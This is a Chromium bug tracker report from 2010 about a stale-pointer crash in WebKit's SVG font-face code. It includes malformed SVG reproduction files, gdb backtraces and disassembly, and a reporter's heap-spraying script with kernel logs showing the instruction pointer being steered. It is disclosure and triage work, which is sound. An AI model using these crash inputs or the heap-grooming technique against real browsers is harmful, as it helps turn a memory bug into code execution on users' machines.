# Stale pointer in CSSFontFaceSource::m_svgFontFaceElement

| Field | Value |
|-------|-------|
| **Issue ID** | [40086502](https://issues.chromium.org/issues/40086502) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | js...@chromium.org |
| **Created** | 2010-12-27 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

opening html crashes tab

**VERSION**  

Chrome Version:  

Operating System:  

Windows XP + 8.0.552.224  

OSX Snow Leopard + 8.0.552.231  

Ubuntu 10.10 64-bit + 8.0.552.224  

Ubuntu 10.10 64-bit + chromium-browser 10.0.623.0~~svn20101226r70187-0ubuntu1~~ucd1~ma

**REPRODUCTION CASE**  

<svg>>  

<g id="B">  

<text font-family="x" f=""><textPath>  

</text>  

<text font-family="x" f="">  

<defs>  

<linearGradient id="g"><animateTransform attributeName="gradientTransform"/></linearGradient>  

<font><font-face font-family="x" x=""/></font>  

<text font-family="x">  

<xmlns:xlink="f:/x/0000/" bbb=""a

v="2" e  

gg f c ff r/0 p q"n q <=<  

="> m<2# < t-"/>

</g>
<use xlink:href="#B"><use xlink:href="#B">

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: sad tab  

Crash State:  

(gdb) run  

Starting program: /usr/lib/chromium-browser/chromium-browser --single-process x.html

Program received signal SIGSEGV, Segmentation fault.  

[Switching to Thread 0x7fffe1c04700 (LWP 25840)]  

0x00007ffff664d6bf in WebCore::Element::getAttribute (this=0x7ffff91a4640, name=...) at third\_party/WebKit/WebCore/dom/Element.cpp:230  

230 in third\_party/WebKit/WebCore/dom/Element.cpp  

(gdb) i r  

rax 0x100000001 4294967297  

rbx 0x7ffff91a4640 140737372636736  

rcx 0x7ffff919d870 140737372608624  

rdx 0x7ffff90ccc00 140737371753472  

rsi 0x7ffff84b0458 140737359053912  

rdi 0x7ffff91a4640 140737372636736  

rbp 0x7ffff84b0458 0x7ffff84b0458  

rsp 0x7fffe1c01ab0 0x7fffe1c01ab0  

r8 0x7ffff8fcb2a0 140737370698400  

r9 0x80000 524288  

r10 0x0 0  

r11 0x0 0  

r12 0x7ffff919d870 140737372608624  

r13 0x0 0  

r14 0x0 0  

r15 0x7ffff8fcb2a0 140737370698400  

rip 0x7ffff664d6bf 0x7ffff664d6bf <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+191>  

eflags 0x10246 [ PF ZF IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

fs 0x0 0  

gs 0x0 0  

(gdb) bt  

#0 0x00007ffff664d6bf in WebCore::Element::getAttribute (this=0x7ffff91a4640, name=...) at third\_party/WebKit/WebCore/dom/Element.cpp:230  

#1 0x00007ffff6a3ab7c in WebCore::SVGFontFaceElement::horizontalOriginX (this=<value optimized out>) at third\_party/WebKit/WebCore/svg/SVGFontFaceElement.cpp:146  

#2 0x00007ffff6a36152 in WebCore::SVGFontData::SVGFontData (this=0x7ffff919d870, fontFaceElement=0x7ffff84b0458) at third\_party/WebKit/WebCore/svg/SVGFontData.cpp:34  

#3 0x00007ffff69caaf7 in WebCore::CSSFontFaceSource::getFontData (this=0x7ffff90d03c0, fontDescription=..., syntheticBold=false, syntheticItalic=<value optimized out>, fontSelector=<value optimized out>)  

at third\_party/WebKit/WebCore/css/CSSFontFaceSource.cpp:171  

#4 0x00007ffff69c9c2c in WebCore::CSSFontFace::getFontData (this=0x7ffff8fcb960, fontDescription=..., syntheticBold=<value optimized out>, syntheticItalic=<value optimized out>)  

at third\_party/WebKit/WebCore/css/CSSFontFace.cpp:112  

#5 0x00007ffff69492c8 in WebCore::CSSSegmentedFontFace::getFontData (this=0x7ffff91ce550, fontDescription=...) at third\_party/WebKit/WebCore/css/CSSSegmentedFontFace.cpp:106  

#6 0x00007ffff6940061 in WebCore::CSSFontSelector::getFontData (this=0x0, fontDescription=<value optimized out>, familyName=<value optimized out>) at third\_party/WebKit/WebCore/css/CSSFontSelector.cpp:543  

#7 0x00007ffff64d5965 in WebCore::FontCache::getFontData (this=0x7ffff8f09fe8, font=..., familyIndex=@0x7ffff906c6f0, fontSelector=0x7ffff8fcb2a0)  

at third\_party/WebKit/WebCore/platform/graphics/FontCache.cpp:386  

#8 0x00007ffff64d5dda in WebCore::FontFallbackList::fontDataAt (this=0x7ffff906c690, font=<value optimized out>, realizedFontIndex=<value optimized out>)  

at third\_party/WebKit/WebCore/platform/graphics/FontFallbackList.cpp:105  

#9 0x00007ffff64d5e98 in primaryFontData (this=0x7ffff91a4640, font=0x7ffff84b0458) at third\_party/WebKit/WebCore/platform/graphics/FontFallbackList.h:66  

#10 WebCore::FontFallbackList::determinePitch (this=0x7ffff91a4640, font=0x7ffff84b0458) at third\_party/WebKit/WebCore/platform/graphics/FontFallbackList.cpp:76  

#11 0x00007ffff684302b in isFixedPitch (this=0x7ffff91855a0, resolver=<value optimized out>, firstLine=<value optimized out>, isLineEmpty=<value optimized out>,  

previousLineBrokeCleanly=<value optimized out>, hyphenated=@0x7fffe1c0293a, clear=0x7fffe1c02924, lastFloatFromPreviousLine=0x0) at third\_party/WebKit/WebCore/platform/graphics/FontFallbackList.h:47  

#12 isFixedPitch (this=0x7ffff91855a0, resolver=<value optimized out>, firstLine=<value optimized out>, isLineEmpty=<value optimized out>, previousLineBrokeCleanly=<value optimized out>,  

hyphenated=@0x7fffe1c0293a, clear=0x7fffe1c02924, lastFloatFromPreviousLine=0x0) at third\_party/WebKit/WebCore/platform/graphics/Font.h:271  

#13 WebCore::RenderBlock::findNextLineBreak (this=0x7ffff91855a0, resolver=<value optimized out>, firstLine=<value optimized out>, isLineEmpty=<value optimized out>,  

previousLineBrokeCleanly=<value optimized out>, hyphenated=@0x7fffe1c0293a, clear=0x7fffe1c02924, lastFloatFromPreviousLine=0x0) at third\_party/WebKit/WebCore/rendering/RenderBlockLineLayout.cpp:1641  

#14 0x00007ffff6844562 in WebCore::RenderBlock::layoutInlineChildren (this=0x7ffff91855a0, relayoutChildren=<value optimized out>, repaintLogicalTop=@0x7fffe1c02a5c, repaintLogicalBottom=@0x7fffe1c02a58)  

at third\_party/WebKit/WebCore/rendering/RenderBlockLineLayout.cpp:667  

#15 0x00007ffff69d3c7d in forceLayoutInlineChildren (this=0x7ffff91855a0) at third\_party/WebKit/WebCore/rendering/RenderBlock.h:304  

#16 WebCore::RenderSVGText::layout (this=0x7ffff91855a0) at third\_party/WebKit/WebCore/rendering/svg/RenderSVGText.cpp:133  

#17 0x00007ffff69ddd65 in WebCore::SVGRenderSupport::layoutChildren (start=<value optimized out>, selfNeedsLayout=true) at third\_party/WebKit/WebCore/rendering/SVGRenderSupport.cpp:234  

#18 0x00007ffff6a93e86 in WebCore::RenderSVGContainer::layout (this=0x7ffff9185290) at third\_party/WebKit/WebCore/rendering/RenderSVGContainer.cpp:64  

#19 0x00007ffff69ddd65 in WebCore::SVGRenderSupport::layoutChildren (start=<value optimized out>, selfNeedsLayout=true) at third\_party/WebKit/WebCore/rendering/SVGRenderSupport.cpp:234  

#20 0x00007ffff6a93e86 in WebCore::RenderSVGContainer::layout (this=0x7ffff91851e0) at third\_party/WebKit/WebCore/rendering/RenderSVGContainer.cpp:64  

#21 0x00007ffff69ddd65 in WebCore::SVGRenderSupport::layoutChildren (start=<value optimized out>, selfNeedsLayout=true) at third\_party/WebKit/WebCore/rendering/SVGRenderSupport.cpp:234  

#22 0x00007ffff6a93e86 in WebCore::RenderSVGContainer::layout (this=0x7ffff9185120) at third\_party/WebKit/WebCore/rendering/RenderSVGContainer.cpp:64  

#23 0x00007ffff69ddd65 in WebCore::SVGRenderSupport::layoutChildren (start=<value optimized out>, selfNeedsLayout=true) at third\_party/WebKit/WebCore/rendering/SVGRenderSupport.cpp:234  

#24 0x00007ffff6a93e86 in WebCore::RenderSVGContainer::layout (this=0x7ffff9039d18) at third\_party/WebKit/WebCore/rendering/RenderSVGContainer.cpp:64  

#25 0x00007ffff69dde96 in WebCore::SVGRenderSupport::layoutChildren (start=<value optimized out>, selfNeedsLayout=false) at third\_party/WebKit/WebCore/rendering/SVGRenderSupport.cpp:237  

#26 0x00007ffff6aa15a7 in WebCore::RenderSVGRoot::layout (this=0x7ffff9039820) at third\_party/WebKit/WebCore/rendering/RenderSVGRoot.cpp:119  

#27 0x00007ffff67e2ecf in WebCore::FrameView::layout (this=0x7ffff919d870, allowSubtree=<value optimized out>) at third\_party/WebKit/WebCore/page/FrameView.cpp:843  

#28 0x00007ffff663cfdb in WebCore::Document::updateLayoutIgnorePendingStylesheets (this=0x7ffff90e1800) at third\_party/WebKit/WebCore/dom/Document.cpp:1681  

#29 0x00007ffff6a7571e in WebCore::SVGStyledElement::svgAttributeChanged (this=0x7ffff9076780, attrName=...) at third\_party/WebKit/WebCore/svg/SVGStyledElement.cpp:256  

#30 0x00007ffff6a401ce in WebCore::SVGGradientElement::svgAttributeChanged (this=0x7ffff91a4640, attrName=...) at third\_party/WebKit/WebCore/svg/SVGGradientElement.cpp:87  

#31 0x00007ffff6a4e0a3 in WebCore::SVGLinearGradientElement::svgAttributeChanged (this=0x7ffff91a4640, attrName=...) at third\_party/WebKit/WebCore/svg/SVGLinearGradientElement.cpp:79  

#32 0x00007ffff66601d1 in WebCore::NamedNodeMap::addAttribute (this=0x7ffff9196d40, prpAttribute=<value optimized out>) at third\_party/WebKit/WebCore/dom/NamedNodeMap.cpp:261  

#33 0x00007ffff6653d42 in WebCore::Element::setAttribute (this=0x7ffff9076780, name=..., value=...) at third\_party/WebKit/WebCore/dom/Element.cpp:656  

#34 0x00007ffff6653fbe in WebCore::Element::setAttribute (this=0x7ffff91a4640, name=..., value=...) at third\_party/WebKit/WebCore/dom/Element.cpp:194  

#35 0x00007ffff6d528d3 in WebCore::SVGAnimateTransformElement::resetToBaseValue (this=0x7ffff90b3600, baseValue=...) at third\_party/WebKit/WebCore/svg/SVGAnimateTransformElement.cpp:109  

#36 0x00007ffff6aa89be in WebCore::SMILTimeContainer::updateAnimations (this=<value optimized out>, elapsed=DWARF-2 expression error: DW\_OP\_reg operations must be used either alone or in conjuction with DW\_OP\_piece or DW\_OP\_bit\_piece.  

) at third\_party/WebKit/WebCore/svg/animation/SMILTimeContainer.cpp:280  

#37 0x00007ffff6aa94f5 in WebCore::SMILTimeContainer::begin (this=0x7ffff9136210) at third\_party/WebKit/WebCore/svg/animation/SMILTimeContainer.cpp:103  

#38 0x00007ffff6a0520a in WebCore::SVGDocumentExtensions::startAnimations (this=<value optimized out>) at third\_party/WebKit/WebCore/svg/SVGDocumentExtensions.cpp:98  

#39 0x00007ffff6637c6a in WebCore::Document::implicitClose (this=0x7ffff90e1800) at third\_party/WebKit/WebCore/dom/Document.cpp:2170  

#40 0x00007ffff6779f51 in WebCore::FrameLoader::checkCompleted (this=0x7ffff90a6458) at third\_party/WebKit/WebCore/loader/FrameLoader.cpp:849  

#41 0x00007ffff6778eb7 in WebCore::FrameLoader::finishedParsing (this=0x7ffff90a6458) at third\_party/WebKit/WebCore/loader/FrameLoader.cpp:783  

#42 0x00007ffff66374a3 in WebCore::Document::finishedParsing (this=0x7ffff90e1800) at third\_party/WebKit/WebCore/dom/Document.cpp:4227  

#43 0x00007ffff6306888 in WebCore::HTMLDocumentParser::prepareToStopParsing (this=0x7ffff903a400) at third\_party/WebKit/WebCore/html/parser/HTMLDocumentParser.cpp:150  

---Type <return> to continue, or q <return> to quit---  

#44 0x00007ffff63068d4 in WebCore::HTMLDocumentParser::finish (this=0x7ffff903a400) at third\_party/WebKit/WebCore/html/parser/HTMLDocumentParser.cpp:381  

#45 0x00007ffff676ef4f in WebCore::DocumentWriter::endIfNotLoadingMainResource (this=0x7ffff90a6678) at third\_party/WebKit/WebCore/loader/DocumentWriter.cpp:221  

#46 0x00007ffff6779d47 in WebCore::FrameLoader::finishedLoading (this=0x7ffff90a6458) at third\_party/WebKit/WebCore/loader/FrameLoader.cpp:2157  

#47 0x00007ffff6788be2 in WebCore::MainResourceLoader::didFinishLoading (this=0x7ffff90a9700, finishTime=<value optimized out>) at third\_party/WebKit/WebCore/loader/MainResourceLoader.cpp:457  

#48 0x00007ffff603b7a9 in webkit\_glue::WebURLLoaderImpl::Context::OnCompletedRequest (this=0x7ffff90ac8c0, status=<value optimized out>, security\_info=<value optimized out>, completion\_time=...)  

at webkit/glue/weburlloader\_impl.cc:656  

#49 0x00007ffff6b7629e in ResourceDispatcher::OnRequestComplete (this=<value optimized out>, request\_id=<value optimized out>, status=..., security\_info=..., completion\_time=...)  

at chrome/common/resource\_dispatcher.cc:452  

#50 0x00007ffff6b75fb6 in DispatchToMethod<ResourceDispatcher, void (ResourceDispatcher::\*)(int, URLRequestStatus const&, std::string const&, base::Time const&), int, URLRequestStatus, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> >, base::Time> (this=0x7ffff9054190, message=...) at ./base/tuple.h:577  

#51 Dispatch<ResourceDispatcher, ResourceDispatcher, void (ResourceDispatcher::\*)(int, URLRequestStatus const&, std::string const&, base::Time const&)> (this=0x7ffff9054190, message=...)  

at ./ipc/ipc\_message\_utils.h:928  

#52 ResourceDispatcher::DispatchMessage (this=0x7ffff9054190, message=...) at chrome/common/resource\_dispatcher.cc:525  

#53 0x00007ffff6b7756b in ResourceDispatcher::OnMessageReceived (this=0x7ffff9054190, message=...) at chrome/common/resource\_dispatcher.cc:297  

#54 0x00007ffff6b8d971 in ChildThread::OnMessageReceived (this=0x7ffff9052008, msg=...) at chrome/common/child\_thread.cc:144  

#55 0x00007ffff59cfe61 in MessageLoop::RunTask (this=0x7fffe1c03a90, task=0x7ffff9116c00) at base/message\_loop.cc:421  

#56 0x00007ffff59d14fb in MessageLoop::DeferOrRunPendingTask (this=0x7fffe1c03a90, pending\_task=<value optimized out>) at base/message\_loop.cc:430  

#57 0x00007ffff59d17ed in MessageLoop::DoWork (this=0x7fffe1c03a90) at base/message\_loop.cc:537  

#58 0x00007ffff59d3669 in base::MessagePumpDefault::Run (this=0x7ffff9053000, delegate=0x7fffe1c03a90) at base/message\_pump\_default.cc:23  

#59 0x00007ffff59d0abc in RunHandler (this=0x7ffff91a4640) at base/message\_loop.cc:241  

#60 MessageLoop::Run (this=0x7ffff91a4640) at base/message\_loop.cc:219  

#61 0x00007ffff59f13a5 in base::Thread::ThreadMain (this=0x7ffff9014f00) at base/thread.cc:164  

#62 0x00007ffff59e1052 in ThreadFunc (params=<value optimized out>) at base/platform\_thread\_posix.cc:53  

#63 0x00007ffff10c7971 in start\_thread (arg=<value optimized out>) at pthread\_create.c:304  

#64 0x00007fffee9a492d in clone () at ../sysdeps/unix/sysv/linux/x86\_64/clone.S:112  

#65 0x0000000000000000 in ?? ()  

(gdb) disas  

Dump of assembler code for function WebCore::Element::getAttribute(WebCore::QualifiedName const&) const:  

0x00007ffff664d600 <+0>: push %rbp  

0x00007ffff664d601 <+1>: mov %rsi,%rbp  

0x00007ffff664d604 <+4>: push %rbx  

0x00007ffff664d605 <+5>: mov %rdi,%rbx  

0x00007ffff664d608 <+8>: sub $0x8,%rsp  

0x00007ffff664d60c <+12>: mov 0x1d767fd(%rip),%rax # 0x7ffff83c3e10  

0x00007ffff664d613 <+19>: mov (%rax),%rdx  

0x00007ffff664d616 <+22>: cmp %rdx,(%rsi)  

0x00007ffff664d619 <+25>: je 0x7ffff664d6ca <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+202>  

0x00007ffff664d61f <+31>: mov 0x48(%rbx),%eax  

0x00007ffff664d622 <+34>: test $0x400000,%eax  

0x00007ffff664d627 <+39>: je 0x7ffff664d6b6 <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+182>  

0x00007ffff664d62d <+45>: mov 0x68(%rbx),%rax  

0x00007ffff664d631 <+49>: test %rax,%rax  

0x00007ffff664d634 <+52>: je 0x7ffff664d6a8 <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+168>  

0x00007ffff664d636 <+54>: mov 0x18(%rax),%r8d  

0x00007ffff664d63a <+58>: test %r8d,%r8d  

0x00007ffff664d63d <+61>: je 0x7ffff664d6a8 <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+168>  

0x00007ffff664d63f <+63>: mov 0x20(%rax),%rdi  

0x00007ffff664d643 <+67>: mov 0x0(%rbp),%rsi  

0x00007ffff664d647 <+71>: mov (%rdi),%rax  

0x00007ffff664d64a <+74>: mov 0x8(%rax),%rdx  

0x00007ffff664d64e <+78>: cmp %rsi,%rdx  

0x00007ffff664d651 <+81>: je 0x7ffff664d67f <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+127>  

0x00007ffff664d653 <+83>: mov 0x10(%rsi),%rbp  

0x00007ffff664d657 <+87>: mov $0x8,%ecx  

0x00007ffff664d65c <+92>: xor %ebx,%ebx  

0x00007ffff664d65e <+94>: xchg %ax,%ax  

0x00007ffff664d660 <+96>: cmp %rbp,0x10(%rdx)  

0x00007ffff664d664 <+100>: je 0x7ffff664d690 <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+144>  

0x00007ffff664d666 <+102>: add $0x1,%ebx  

0x00007ffff664d669 <+105>: cmp %ebx,%r8d  

0x00007ffff664d66c <+108>: jbe 0x7ffff664d6a8 <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+168>  

0x00007ffff664d66e <+110>: mov (%rdi,%rcx,1),%rax  

0x00007ffff664d672 <+114>: add $0x8,%rcx  

0x00007ffff664d676 <+118>: mov 0x8(%rax),%rdx  

0x00007ffff664d67a <+122>: cmp %rsi,%rdx  

0x00007ffff664d67d <+125>: jne 0x7ffff664d660 <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+96>  

0x00007ffff664d67f <+127>: add $0x8,%rsp  

0x00007ffff664d683 <+131>: add $0x10,%rax  

0x00007ffff664d687 <+135>: pop %rbx  

0x00007ffff664d688 <+136>: pop %rbp  

0x00007ffff664d689 <+137>: retq  

0x00007ffff664d68a <+138>: jmp 0x7ffff664d690 <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+144>  

0x00007ffff664d68c <+140>: nop  

0x00007ffff664d68d <+141>: nop  

0x00007ffff664d68e <+142>: nop  

0x00007ffff664d68f <+143>: nop  

0x00007ffff664d690 <+144>: mov 0x18(%rsi),%r9  

0x00007ffff664d694 <+148>: cmp %r9,0x18(%rdx)  

0x00007ffff664d698 <+152>: je 0x7ffff664d67f <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+127>  

---Type <return> to continue, or q <return> to quit---  

0x00007ffff664d69a <+154>: add $0x1,%ebx  

0x00007ffff664d69d <+157>: cmp %ebx,%r8d  

0x00007ffff664d6a0 <+160>: ja 0x7ffff664d66e <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+110>  

0x00007ffff664d6a2 <+162>: jmp 0x7ffff664d6a8 <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+168>  

0x00007ffff664d6a4 <+164>: nop  

0x00007ffff664d6a5 <+165>: nop  

0x00007ffff664d6a6 <+166>: nop  

0x00007ffff664d6a7 <+167>: nop  

0x00007ffff664d6a8 <+168>: mov 0x1d715e9(%rip),%rax # 0x7ffff83bec98  

0x00007ffff664d6af <+175>: add $0x8,%rsp  

0x00007ffff664d6b3 <+179>: pop %rbx  

0x00007ffff664d6b4 <+180>: pop %rbp  

0x00007ffff664d6b5 <+181>: retq  

0x00007ffff664d6b6 <+182>: mov (%rbx),%rax  

0x00007ffff664d6b9 <+185>: mov %rbp,%rsi  

0x00007ffff664d6bc <+188>: mov %rbx,%rdi  

=> 0x00007ffff664d6bf <+191>: callq \*0x480(%rax)  

0x00007ffff664d6c5 <+197>: jmpq 0x7ffff664d62d <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+45>  

0x00007ffff664d6ca <+202>: mov 0x48(%rdi),%eax  

0x00007ffff664d6cd <+205>: test $0x100000,%eax  

0x00007ffff664d6d2 <+210>: jne 0x7ffff664d622 <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+34>  

0x00007ffff664d6d8 <+216>: mov (%rdi),%rax  

0x00007ffff664d6db <+219>: jmp 0x7ffff664d6e0 <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+224>  

0x00007ffff664d6dd <+221>: nop  

0x00007ffff664d6de <+222>: nop  

0x00007ffff664d6df <+223>: nop  

0x00007ffff664d6e0 <+224>: callq \*0x478(%rax)  

0x00007ffff664d6e6 <+230>: jmpq 0x7ffff664d61f <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+31>  

End of assembler dump.  

(gdb) c  

Continuing.  

Program terminated with signal SIGSEGV, Segmentation fault.  

The program no longer exists.

## Attachments

- [14l.html](attachments/14l.html) (text/plain; charset=us-ascii, 398 B)
- [yeah.html](attachments/yeah.html) (text/plain; charset=us-ascii, 680 B)
- [small.html](attachments/small.html) (text/plain; charset=us-ascii, 243 B)

## Timeline

### js...@chromium.org (2010-12-27)

Can repro on stable but not trunk. I'll take a closer look tomorrow.

### mi...@gmail.com (2010-12-28)

[Comment Deleted]

### sk...@chromium.org (2010-12-28)

Thanks, I can reproduce with 10.0.623.0 (70217) on Win7. They all trigger the same NULL ptr; it does not appear to be a security issue.

I've cleaned up the repro, which triggers the same issue with a slightly different stack:
<svg>
  <g id="R">
    <defs>
      <linearGradient>
        <animateTransform attributeName="gradientTransform"/>
      </linearGradient>
      <font><font-face font-family="x"/></font>
    </defs>
    <text font-family="x" f=""><textPath/>
</text>
  </g>
  <use xlink:href="#R"><use xlink:href="#R">
</svg>

id:             chrome.dll!WebCore::Element::getAttribute ReadAV@NULL (e638d540e2cf85abe8d8ca45ba18ccef)
description:    Attempt to read from unallocated NULL pointer+0x23E in chrome.dll!WebCore::Element::getAttribute
application:    Chromium 10.0.623.0
stack:          chrome.dll!WebCore::Element::getAttribute
                chrome.dll!WebCore::SVGFontFaceElement::unitsPerEm
                chrome.dll!WebCore::SimpleFontData::SimpleFontData
                chrome.dll!WebCore::CSSFontFaceSource::getFontData
                chrome.dll!WebCore::CSSFontFace::getFontData
                chrome.dll!WebCore::CSSSegmentedFontFace::getFontData
                chrome.dll!WebCore::CSSFontSelector::getFontData
                chrome.dll!WebCore::FontCache::getFontData
                chrome.dll!WebCore::FontFallbackList::fontDataAt
                chrome.dll!WebCore::FontFallbackList::determinePitch
                chrome.dll!WebCore::RenderBlock::findNextLineBreak
                chrome.dll!WebCore::RenderBlock::layoutInlineChildren
                chrome.dll!WebCore::RenderSVGText::layout
                chrome.dll!WebCore::SVGRenderSupport::layoutChildren
                chrome.dll!WebCore::RenderSVGContainer::layout
                chrome.dll!WebCore::SVGRenderSupport::layoutChildren
                chrome.dll!WebCore::RenderSVGContainer::layout
                chrome.dll!WebCore::SVGRenderSupport::layoutChildren
                chrome.dll!WebCore::RenderSVGContainer::layout
                chrome.dll!WebCore::SVGRenderSupport::layoutChildren
                chrome.dll!WebCore::RenderSVGContainer::layout
                chrome.dll!WebCore::SVGRenderSupport::layoutChildren
                chrome.dll!WebCore::RenderSVGRoot::layout
                chrome.dll!WebCore::FrameView::layout
                chrome.dll!WebCore::Document::updateLayout
                chrome.dll!WebCore::Document::updateLayoutIgnorePendingStylesheets
                chrome.dll!WebCore::SVGStyledElement::svgAttributeChanged
                chrome.dll!WebCore::SVGGradientElement::svgAttributeChanged
                chrome.dll!WebCore::SVGLinearGradientElement::svgAttributeChanged
                chrome.dll!WebCore::SVGElement::attributeChanged
                chrome.dll!WebCore::NamedNodeMap::addAttribute
                chrome.dll!WebCore::Element::setAttribute
                chrome.dll!WebCore::Element::setAttribute
                chrome.dll!WebCore::SVGAnimateTransformElement::resetToBaseValue
                chrome.dll!WebCore::SMILTimeContainer::updateAnimations
                chrome.dll!WebCore::SMILTimeContainer::begin
                chrome.dll!WebCore::SVGDocumentExtensions::startAnimations
                chrome.dll!WebCore::FrameLoader::checkCompleted
                chrome.dll!WebCore::FrameLoader::finishedParsing
                chrome.dll!WebCore::Document::finishedParsing
                chrome.dll!WebCore::HTMLDocumentParser::prepareToStopParsing
                chrome.dll!WebCore::DocumentWriter::endIfNotLoadingMainResource
                chrome.dll!WebCore::FrameLoader::finishedLoading
                chrome.dll!WebCore::MainResourceLoader::didFinishLoading
                chrome.dll!WebCore::ResourceLoader::didFinishLoading
                chrome.dll!WebCore::ResourceHandleInternal::didFinishLoading
                chrome.dll!webkit_glue::WebURLLoaderImpl::Context::OnCompletedRequest
                chrome.dll!ResourceDispatcher::OnRequestComplete
                chrome.dll!IPC::MessageWithTuple<...>::Dispatch<ResourceDispatcher,ResourceDispatcher,void 
                chrome.dll!ResourceDispatcher::DispatchMessageW
                chrome.dll!ResourceDispatcher::OnMessageReceived
                chrome.dll!ChildThread::OnMessageReceived
                chrome.dll!RunnableMethod<ProfileWriter,void 
                chrome.dll!MessageLoop::RunTask
                chrome.dll!MessageLoop::DoWork
                chrome.dll!base::MessagePumpDefault::Run
                chrome.dll!MessageLoop::RunInternal
                ...

### sk...@chromium.org (2010-12-28)

Upstream: https://bugs.webkit.org/show_bug.cgi?id=51675
Marked as security just in case my analysis is incorrect. Feel free to remove the flag if you confirm this is a NULL ptr.

### mi...@gmail.com (2010-12-28)

the magical crap in the original repro, not properly reproduced in the cut and paste, are what cause RAX not to be null.  if RAX+0x480 is a readable address then it will jump to the value contained there and segfault at IP. 

### sk...@chromium.org (2010-12-28)

I tested your original repro (14l.html) 20 times on 10.0.623.0 (70217)/Win7 and found only one NULL ptr. I tested the 3 other repros (r1-r3.html) 10 times each and got the same NULL ptr.
Maybe this is not a NULL ptr in 64-bit code, as rax % 0xFFFF,FFFF = 0x0000,0001 == effectively NULL. Do you see crashes with varying values of rax or is it always 0x1,0000,0001?

### mi...@gmail.com (2010-12-28)

allocating something before the repro seems to increase the likelyhood of hitting something other than 0x1,0000,0001

<script>
  var a = [];
  for (var i=0; i<1000000;i++) {
      a[i]="AAAAAA";
  }
</script>

tail -f /var/log/kern.log |grep -E "segfault at|RAX|general":

Dec 28 17:42:45  kernel: [89701.842885] chrome[21952] general protection ip:18305d6 sp:7fffa91ef400 error:0 in chrome[400000+2e3c000]
Dec 28 17:42:45  kernel: [89701.842942] RAX: 0000000003952c80 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:06  kernel: [89723.419507] chrome[21957]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:06  kernel: [89723.419564] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:13  kernel: [89729.706372] chrome[21960]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:13  kernel: [89729.706426] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:13  kernel: [89730.006759] chrome[21963]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:13  kernel: [89730.006812] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:13  kernel: [89730.216869] chrome[21966]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:13  kernel: [89730.216983] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:13  kernel: [89730.395193] chrome[21969]: segfault at 7f4ec2387051 ip 00007f4ec2387051 sp 00007fffa91ef3f8 error 15
Dec 28 17:43:13  kernel: [89730.395244] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:14  kernel: [89730.544830] chrome[21972]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:14  kernel: [89730.544941] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:14  kernel: [89730.703323] chrome[21975]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:14  kernel: [89730.703376] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:14  kernel: [89730.854535] chrome[21978]: segfault at 425cc60 ip 000000000425cc60 sp 00007fffa91ef3f8 error 15
Dec 28 17:43:14  kernel: [89730.854590] RAX: 000000000394ffc0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:14  kernel: [89730.994957] chrome[21981]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:14  kernel: [89730.995010] RAX: 0000000003950cc0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:14  kernel: [89731.114845] chrome[21984]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:14  kernel: [89731.114899] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:20  kernel: [89736.818371] chrome[21987]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:20  kernel: [89736.818428] RAX: 0000000003950cc0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:20  kernel: [89736.991945] chrome[21990]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:20  kernel: [89736.992001] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:20  kernel: [89737.151074] chrome[21993]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
